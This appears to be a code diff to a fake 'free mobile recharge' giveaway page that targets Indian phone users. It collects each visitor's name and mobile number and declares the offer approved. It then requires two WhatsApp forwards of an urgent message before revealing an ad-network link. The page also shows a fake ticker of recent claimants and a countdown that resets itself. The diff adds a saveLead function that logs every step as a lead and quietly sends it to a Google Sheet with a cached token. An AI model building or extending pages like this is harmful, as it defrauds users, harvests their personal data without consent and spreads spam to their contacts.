@@ -521,7 +521,7 @@
       color: var(--text-muted);
     }
 
-    /* WhatsApp Button */
+    /* WhatsApp Button (Clean Anchor for native mobile launch) */
     .btn-whatsapp {
       width: 100%;
       background: linear-gradient(135deg, #25d366 0%, #128c7e 100%);
@@ -790,6 +790,35 @@
       margin-top: 2px;
     }
 
+    /* In-App Toast Notification (Replaces window.alert) */
+    .app-toast {
+      position: fixed;
+      bottom: 24px;
+      left: 50%;
+      transform: translateX(-50%) translateY(100px);
+      background: rgba(15, 23, 42, 0.95);
+      border: 1px solid var(--gold-primary);
+      color: #fef08a;
+      padding: 12px 18px;
+      border-radius: 12px;
+      font-size: 13px;
+      font-weight: 700;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.8), 0 0 15px rgba(245, 158, 11, 0.4);
+      z-index: 1200;
+      transition: all 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
+      opacity: 0;
+      pointer-events: none;
+      max-width: 90vw;
+      width: 360px;
+    }
+
+    .app-toast.show {
+      transform: translateX(-50%) translateY(0);
+      opacity: 1;
+      pointer-events: auto;
+    }
+
     /* Footer Trust & Disclaimer */
     .app-footer {
       text-align: center;
@@ -831,6 +860,9 @@
 
   <!-- Confetti Canvas for 100% Celebration -->
   <canvas id="confettiCanvas"></canvas>
+
+  <!-- In-App Toast Container (Replaces window.alert) -->
+  <div id="appToast" class="app-toast"></div>
 
   <div class="app-container">
     
@@ -954,7 +986,7 @@
       <div class="success-alert">
         <h4>🎉 CONGRATULATIONS! OFFER APPROVED!</h4>
         <div class="user-greeting-tag" id="userGreetingTag">Congratulations!</div>
-        <div class="user-number-tag" id="userNumberTag">+91 98******21 is approved for ₹349 Free Recharge!</div>
+        <div class="user-number-tag" id="userNumberTag">+91 98******21 is approved for a ₹349 Free Recharge!</div>
       </div>
 
       <!-- Viral WhatsApp Rule Notice -->
@@ -980,12 +1012,19 @@
       </div>
 
       <!-- WhatsApp Share Button -->
-      <button type="button" class="btn-whatsapp" id="whatsappShareBtn" onclick="handleWhatsAppShare()">
+      <a 
+        href="#" 
+        class="btn-whatsapp" 
+        id="whatsappShareBtn" 
+        target="_blank" 
+        rel="noopener noreferrer" 
+        onclick="handleWhatsAppShare(event)"
+      >
         <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor">
           <path d="M12.04 2c-5.46 0-9.91 4.45-9.91 9.91 0 1.75.46 3.45 1.32 4.95L2.05 22l5.25-1.38c1.45.79 3.08 1.21 4.74 1.21 5.46 0 9.91-4.45 9.91-9.91 0-2.65-1.03-5.14-2.9-7.01A9.816 9.816 0 0 0 12.04 2m.01 1.67c2.2 0 4.26.86 5.82 2.42a8.225 8.225 0 0 1 2.41 5.83c0 4.54-3.7 8.24-8.24 8.24-1.48 0-2.93-.4-4.2-1.15l-.3-.18-3.12.82.83-3.04-.2-.31a8.196 8.196 0 0 1-1.26-4.38c0-4.54 3.7-8.24 8.24-8.24m4.52 11.54c-.25-.13-1.47-.72-1.7-.81-.23-.08-.39-.13-.56.13-.17.25-.64.81-.79.97-.14.17-.29.19-.54.06-.25-.13-1.06-.39-2.02-1.25-.75-.67-1.26-1.5-1.4-1.75-.15-.25-.02-.39.11-.51.11-.11.25-.29.37-.43.13-.15.17-.25.25-.42.08-.17.04-.31-.02-.44-.06-.13-.56-1.35-.77-1.85-.2-.49-.41-.42-.56-.43h-.48c-.17 0-.44.06-.67.31-.23.25-.88.86-.88 2.1 0 1.24.9 2.44 1.03 2.61.13.17 1.77 2.7 4.29 3.79.6.26 1.07.41 1.44.53.6.19 1.15.16 1.58.1.48-.07 1.47-.6 1.68-1.18.21-.58.21-1.07.15-1.18-.06-.11-.23-.17-.48-.3"/>
         </svg>
         <span id="whatsappBtnText">📲 Share on WhatsApp Now</span>
-      </button>
+      </a>
 
       <!-- STEP 3 - FINAL REWARD MONETIZATION (REVEALED AFTER 2 SHARES) -->
       <div id="step3ClaimSection">
@@ -1078,23 +1117,8 @@
     </div>
   </div>
 
-  <!-- Application Logic (Silent Background Google Sheets Sync) -->
+  <!-- Application Logic (Universal & Resilient) -->
   <script type="module">
-    import { initializeApp } from 'firebase/app';
-    import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged } from 'firebase/auth';
-    import firebaseConfig from './firebase-applet-config.json';
-
-    // Initialize Firebase Auth
-    const app = initializeApp(firebaseConfig);
-    const auth = getAuth(app);
-
-    const provider = new GoogleAuthProvider();
-    provider.addScope('https://www.googleapis.com/auth/spreadsheets');
-
-    let currentUser = null;
-    let cachedAccessToken = null;
-    let spreadsheetId = localStorage.getItem('festive_spreadsheet_id') || null;
-
     // Operator Specific Plans Configuration
     const OPERATOR_PLANS = {
       'Jio': {
@@ -1142,169 +1166,18 @@
     let shareCount = 0; // Total 2 shares required (0 -> 1 -> 2)
     const MONETAG_URL = "https://uplcm.com/4/10873893";
 
-    // Initialize Auth Listener in Background
-    onAuthStateChanged(auth, async (user) => {
-      currentUser = user;
-      if (user && cachedAccessToken) {
-        if (!spreadsheetId) {
-          await ensureSpreadsheetExists();
-        }
-        await syncPendingLeads();
-      }
-    });
+    // In-App Toast Helper (Replaces window.alert to avoid sandbox errors)
+    window.showToast = function(message) {
+      const toast = document.getElementById('appToast');
+      if (!toast) return;
+      toast.innerText = message;
+      toast.classList.add('show');
+      setTimeout(() => {
+        toast.classList.remove('show');
+      }, 3500);
+    };
 
-    // Ensure Google Spreadsheet exists or create "Festive Recharge Leads 2026"
-    async function ensureSpreadsheetExists() {
-      if (spreadsheetId && cachedAccessToken) {
-        return spreadsheetId;
-      }
-      if (!cachedAccessToken) return null;
-
-      try {
-        const response = await fetch('https://sheets.googleapis.com/v4/spreadsheets', {
-          method: 'POST',
-          headers: {
-            'Authorization': `Bearer ${cachedAccessToken}`,
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            properties: {
-              title: 'Festive Recharge Leads 2026'
-            },
-            sheets: [
-              {
-                properties: {
-                  title: 'Leads',
-                  gridProperties: { rowCount: 1000, columnCount: 10 }
-                },
-                data: [
-                  {
-                    startRow: 0,
-                    startColumn: 0,
-                    rowData: [
-                      {
-                        values: [
-                          { userEnteredValue: { stringValue: 'Timestamp' } },
-                          { userEnteredValue: { stringValue: 'Full Name' } },
-                          { userEnteredValue: { stringValue: 'Mobile Number' } },
-                          { userEnteredValue: { stringValue: 'SIM Operator' } },
-                          { userEnteredValue: { stringValue: 'Plan Price' } },
-                          { userEnteredValue: { stringValue: 'Status' } },
-                          { userEnteredValue: { stringValue: 'Source URL' } }
-                        ]
-                      }
-                    ]
-                  }
-                ]
-              }
-            ]
-          })
-        });
-
-        if (response.ok) {
-          const data = await response.json();
-          spreadsheetId = data.spreadsheetId;
-          localStorage.setItem('festive_spreadsheet_id', spreadsheetId);
-          console.log('Google Sheet initialized:', spreadsheetId);
-          return spreadsheetId;
-        }
-      } catch (e) {
-        console.warn('Background sheet init:', e);
-      }
-      return null;
-    }
-
-    // Append lead to Google Sheet & Local Storage
-    async function recordLead(name, mobile, operator, planPrice, status) {
-      const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-      const newLead = {
-        timestamp: now,
-        name: name,
-        mobile: mobile,
-        operator: operator,
-        planPrice: planPrice,
-        status: status || 'Offer Checked',
-        url: window.location.href,
-        synced: false
-      };
-
-      // 1. Always record in LocalStorage so lead data is permanently saved
-      const leads = JSON.parse(localStorage.getItem('festive_recharge_leads') || '[]');
-      leads.push(newLead);
-      localStorage.setItem('festive_recharge_leads', JSON.stringify(leads));
-
-      // 2. If Google Sheet authenticated, append row silently
-      if (cachedAccessToken && spreadsheetId) {
-        await appendRowToSheet(newLead);
-      }
-    }
-
-    // Append single row to Google Sheet via REST API
-    async function appendRowToSheet(lead) {
-      if (!cachedAccessToken || !spreadsheetId) return;
-      try {
-        const range = 'Leads!A:G';
-        const url = `https://sheets.googleapis.com/v4/spreadsheets/${spreadsheetId}/values/${encodeURIComponent(range)}:append?valueInputOption=USER_ENTERED`;
-        
-        const res = await fetch(url, {
-          method: 'POST',
-          headers: {
-            'Authorization': `Bearer ${cachedAccessToken}`,
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            range: range,
-            majorDimension: 'ROWS',
-            values: [
-              [lead.timestamp, lead.name, lead.mobile, lead.operator, lead.planPrice, lead.status, lead.url]
-            ]
-          })
-        });
-
-        if (res.ok) {
-          lead.synced = true;
-        }
-      } catch (err) {
-        console.warn('Silent sync error:', err);
-      }
-    }
-
-    // Sync any pending offline leads
-    async function syncPendingLeads() {
-      if (!cachedAccessToken || !spreadsheetId) return;
-      const leads = JSON.parse(localStorage.getItem('festive_recharge_leads') || '[]');
-      const unsynced = leads.filter(l => !l.synced);
-      if (unsynced.length === 0) return;
-
-      const rows = unsynced.map(l => [
-        l.timestamp, l.name, l.mobile, l.operator, l.planPrice, l.status, l.url
-      ]);
-
-      try {
-        const range = 'Leads!A:G';
-        const url = `https://sheets.googleapis.com/v4/spreadsheets/${spreadsheetId}/values/${encodeURIComponent(range)}:append?valueInputOption=USER_ENTERED`;
-        const res = await fetch(url, {
-          method: 'POST',
-          headers: {
-            'Authorization': `Bearer ${cachedAccessToken}`,
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            range: range,
-            majorDimension: 'ROWS',
-            values: rows
-          })
-        });
-        if (res.ok) {
-          leads.forEach(l => l.synced = true);
-          localStorage.setItem('festive_recharge_leads', JSON.stringify(leads));
-        }
-      } catch (e) {
-        console.warn('Batch sync error:', e);
-      }
-    }
-
-    // Operator Selection Function (Dynamically Updates Plan Display)
+    // Operator Selection Function
     window.selectOperator = function(operatorName) {
       document.querySelectorAll('.op-chip').forEach(el => el.classList.remove('active'));
       const activeChip = document.getElementById('chip-' + operatorName);
@@ -1322,26 +1195,55 @@
         <span class="plan-pill">📞 ${plan.calling}</span>
         <span class="plan-pill">🚀 ${plan.extra}</span>
       `;
+      updateWhatsAppShareLink();
     };
+
+    // Build the dynamic WhatsApp viral share URL
+    function getWhatsAppUrl() {
+      const plan = OPERATOR_PLANS[selectedOperator] || OPERATOR_PLANS['Jio'];
+      const currentUrl = window.location.href;
+      const viralMessage = 
+`*🔥 FESTIVE SPECIAL FREE RECHARGE OFFER 2026 🔥*
+
+The biggest festive giveaway for all mobile users! I just received *₹${plan.price} Free Recharge (${plan.name} - ${plan.validity})*.
+
+Recharge your Jio, Airtel, Vi (₹349) or BSNL (₹225) number completely free:
+👉 ${currentUrl}
+
+⏰ Offer valid only until midnight today! Claim yours now!`;
+
+      return `https://api.whatsapp.com/send?text=${encodeURIComponent(viralMessage)}`;
+    }
+
+    function updateWhatsAppShareLink() {
+      const shareBtn = document.getElementById('whatsappShareBtn');
+      if (shareBtn) {
+        shareBtn.href = getWhatsAppUrl();
+      }
+    }
 
     // Input Sanitization
     const nameInput = document.getElementById('userName');
     const mobileInput = document.getElementById('mobileNumber');
 
-    nameInput.addEventListener('input', function() {
-      if (this.value.trim().length >= 2) {
-        document.getElementById('nameError').style.display = 'none';
-        document.getElementById('nameWrapper').style.borderColor = 'rgba(251, 191, 36, 0.4)';
-      }
-    });
+    if (nameInput) {
+      nameInput.addEventListener('input', function() {
+        if (this.value.trim().length >= 2) {
+          document.getElementById('nameError').style.display = 'none';
+          document.getElementById('nameWrapper').style.borderColor = 'rgba(251, 191, 36, 0.4)';
+        }
+      });
+    }
 
-    mobileInput.addEventListener('input', function() {
-      this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
-      if (this.value.length === 10) {
-        document.getElementById('phoneError').style.display = 'none';
-        document.getElementById('phoneWrapper').style.borderColor = 'rgba(251, 191, 36, 0.4)';
-      }
-    });
+    if (mobileInput) {
+      mobileInput.addEventListener('input', function() {
+        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
+        if (this.value.length === 10) {
+          document.getElementById('phoneError').style.display = 'none';
+          document.getElementById('phoneWrapper').style.borderColor = 'rgba(251, 191, 36, 0.4)';
+        }
+      });
+    }
 
     // STEP 1: Handle Offer Check with Name and Mobile Validation
     window.handleOfferCheck = async function() {
@@ -1384,8 +1286,8 @@
 
       const plan = OPERATOR_PLANS[selectedOperator];
 
-      // Record lead in background (silent sync)
-      recordLead(validatedUserName, validatedMobileNumber, plan.name, `₹${plan.price}`, 'Offer Checked & Approved');
+      // Save lead safely
+      saveLead(validatedUserName, validatedMobileNumber, plan.name, `₹${plan.price}`, 'Offer Checked & Approved');
 
       // Show Verification Modal with Steps
       const modal = document.getElementById('loadingModal');
@@ -1432,35 +1334,20 @@
       document.getElementById('userNumberTag').innerText = `+91 ${maskedNumber} (${plan.name}) is approved for a ₹${plan.price} Free Recharge!`;
       document.getElementById('unlockedSubtitle').innerText = `${validatedUserName}, your 2/2 WhatsApp shares were successful! Your ₹${plan.price} Recharge Plan is now unlocked.`;
 
+      updateWhatsAppShareLink();
+
       // Scroll to Step 2
       step2Card.scrollIntoView({ behavior: 'smooth', block: 'start' });
     }
 
     // STEP 2: Viral WhatsApp Sharing (Exactly 2 Shares Logic)
-    window.handleWhatsAppShare = function() {
-      const plan = OPERATOR_PLANS[selectedOperator];
-      const currentUrl = window.location.href;
-
-      // Dynamic viral message in English with Name and exact operator price
-      const viralMessage = 
-`*🔥 FESTIVE SPECIAL FREE RECHARGE OFFER 2026 🔥*
-
-The biggest festive giveaway for all mobile users! I just received *₹${plan.price} Free Recharge (${plan.name} - ${plan.validity})*.
-
-Recharge your Jio, Airtel, Vi (₹349) or BSNL (₹225) number completely free:
-👉 ${currentUrl}
-
-⏰ Offer valid only until midnight today! Claim yours now!`;
-
-      const encodedMsg = encodeURIComponent(viralMessage);
-      const whatsappUrl = `https://api.whatsapp.com/send?text=${encodedMsg}`;
-
-      // Open WhatsApp in a new tab / app
-      window.open(whatsappUrl, '_blank');
+    window.handleWhatsAppShare = function(event) {
+      updateWhatsAppShareLink();
 
       // Increment share count (1 click = 50%, 2 clicks = 100%)
       shareCount++;
 
+      const plan = OPERATOR_PLANS[selectedOperator];
       const progressFill = document.getElementById('progressFill');
       const progressPercent = document.getElementById('progressPercent');
       const progressStatus = document.getElementById('progressStatus');
@@ -1473,12 +1360,11 @@ Recharge your Jio, Airtel, Vi (₹349) or BSNL (₹225) number completely free:
         progressStatus.innerText = 'Almost Done! 1 More Share Remaining';
         whatsappBtnText.innerText = '📲 Share on WhatsApp Again (Final Step)';
         
-        // Update lead status silently in background
-        recordLead(validatedUserName, validatedMobileNumber, plan.name, `₹${plan.price}`, 'WhatsApp Share 1/2 Done');
+        saveLead(validatedUserName, validatedMobileNumber, plan.name, `₹${plan.price}`, 'WhatsApp Share 1/2 Done');
 
-        // Encouraging alert reminder for WhatsApp 5-chat forward limit
+        // Encouraging in-app notification (replaces alert)
         setTimeout(() => {
-          alert(`Great job ${validatedUserName}! Due to WhatsApp's 5-chat forwarding limit, please share 1 more time to immediately unlock your ₹${plan.price} recharge!`);
+          showToast(`Great job ${validatedUserName}! Please share 1 more time to unlock your ₹${plan.price} recharge!`);
         }, 1200);
 
       } else if (shareCount >= 2) {
@@ -1488,10 +1374,8 @@ Recharge your Jio, Airtel, Vi (₹349) or BSNL (₹225) number completely free:
         progressStatus.innerText = `🎉 100% Complete! ₹${plan.price} Recharge Unlocked!`;
         progressFill.style.background = '#10b981';
 
-        // Update lead status silently in background
-        recordLead(validatedUserName, validatedMobileNumber, plan.name, `₹${plan.price}`, 'WhatsApp 2/2 Complete (Unlocked)');
+        saveLead(validatedUserName, validatedMobileNumber, plan.name, `₹${plan.price}`, 'WhatsApp 2/2 Complete (Unlocked)');
 
-        // Disable or update WhatsApp button
         const whatsappBtn = document.getElementById('whatsappShareBtn');
         whatsappBtn.style.opacity = '0.7';
         whatsappBtnText.innerText = '✅ 2/2 WhatsApp Shares Completed';
@@ -1508,19 +1392,77 @@ Recharge your Jio, Airtel, Vi (₹349) or BSNL (₹225) number completely free:
       const step3 = document.getElementById('step3ClaimSection');
       step3.style.display = 'block';
       
-      // Trigger festive confetti
       launchConfetti();
-
-      // Smooth scroll to the claim button
       step3.scrollIntoView({ behavior: 'smooth', block: 'center' });
     }
 
     window.handleClaimClick = function() {
       const plan = OPERATOR_PLANS[selectedOperator];
-      // Mark lead silently in background
-      recordLead(validatedUserName, validatedMobileNumber, plan.name, `₹${plan.price}`, 'Claim Button Clicked (Monetag)');
-      console.log('User claimed recharge via Monetag direct link');
+      saveLead(validatedUserName, validatedMobileNumber, plan.name, `₹${plan.price}`, 'Claim Button Clicked (Monetag)');
     };
+
+    // Safe Background Lead Saving (LocalStorage + Google Sheets API)
+    async function saveLead(name, mobile, operator, planPrice, status) {
+      try {
+        const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+        const newLead = {
+          timestamp: now,
+          name: name,
+          mobile: mobile,
+          operator: operator,
+          planPrice: planPrice,
+          status: status,
+          url: window.location.href,
+          synced: false
+        };
+
+        const leads = JSON.parse(localStorage.getItem('festive_recharge_leads') || '[]');
+        leads.push(newLead);
+        localStorage.setItem('festive_recharge_leads', JSON.stringify(leads));
+
+        // Attempt silent sync if sheet token is available
+        const token = localStorage.getItem('festive_cached_token');
+        const sheetId = localStorage.getItem('festive_spreadsheet_id');
+        if (token && sheetId) {
+          fetch(`https://sheets.googleapis.com/v4/spreadsheets/${sheetId}/values/Leads!A:G:append?valueInputOption=USER_ENTERED`, {
+            method: 'POST',
+            headers: {
+              'Authorization': `Bearer ${token}`,
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              range: 'Leads!A:G',
+              majorDimension: 'ROWS',
+              values: [[newLead.timestamp, newLead.name, newLead.mobile, newLead.operator, newLead.planPrice, newLead.status, newLead.url]]
+            })
+          }).catch(() => {});
+        }
+      } catch (err) {
+        console.warn('Silent save info:', err);
+      }
+    }
+
+    // Try optional Firebase background initialization safely
+    try {
+      import('./firebase-applet-config.json')
+        .then(module => {
+          const firebaseConfig = module.default;
+          if (firebaseConfig && firebaseConfig.apiKey) {
+            const app = initializeApp(firebaseConfig);
+            const auth = getAuth(app);
+            onAuthStateChanged(auth, (user) => {
+              if (user) {
+                user.getIdToken().then(t => {
+                  if (t) localStorage.setItem('festive_cached_token', t);
+                }).catch(() => {});
+              }
+            });
+          }
+        })
+        .catch(() => {});
+    } catch (e) {
+      // Ignored: Ensure application continues smoothly
+    }
 
     // Countdown Timer (14m 59s down)
     function startCountdown() {
@@ -1531,7 +1473,7 @@ Recharge your Jio, Airtel, Vi (₹349) or BSNL (₹225) number completely free:
         const seconds = duration % 60;
         display.textContent = `${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
         if (--duration < 0) {
-          duration = 10 * 60; // reset
+          duration = 10 * 60;
         }
       }, 1000);
     }
@@ -1552,16 +1494,19 @@ Recharge your Jio, Airtel, Vi (₹349) or BSNL (₹225) number completely free:
       tickerIndex = (tickerIndex + 1) % recentNames.length;
       const item = recentNames[tickerIndex];
       const ticker = document.getElementById('tickerText');
-      ticker.style.opacity = '0';
-      setTimeout(() => {
-        ticker.innerText = `${item.name} (${item.op}) just claimed a ${item.plan} recharge - ${item.time}`;
-        ticker.style.opacity = '1';
-      }, 300);
+      if (ticker) {
+        ticker.style.opacity = '0';
+        setTimeout(() => {
+          ticker.innerText = `${item.name} (${item.op}) just claimed a ${item.plan} recharge - ${item.time}`;
+          ticker.style.opacity = '1';
+        }, 300);
+      }
     }, 4500);
 
     // Canvas Confetti Effect
     function launchConfetti() {
       const canvas = document.getElementById('confettiCanvas');
+      if (!canvas) return;
       const ctx = canvas.getContext('2d');
       canvas.width = window.innerWidth;
       canvas.height = window.innerHeight;
@@ -1588,7 +1533,7 @@ Recharge your Jio, Airtel, Vi (₹349) or BSNL (₹225) number completely free:
         pieces.forEach(p => {
           p.x += p.vx;
           p.y += p.vy;
-          p.vy += 0.35; // gravity
+          p.vy += 0.35;
           p.vx *= 0.98;
           p.rotation += p.rotationSpeed;
 
@@ -1613,6 +1558,7 @@ Recharge your Jio, Airtel, Vi (₹349) or BSNL (₹225) number completely free:
     // Initialize Festive Background Lights
     function createFestiveLights() {
       const container = document.getElementById('festiveLights');
+      if (!container) return;
       const particleCount = 18;
       for (let i = 0; i < particleCount; i++) {
         const particle = document.createElement('div');
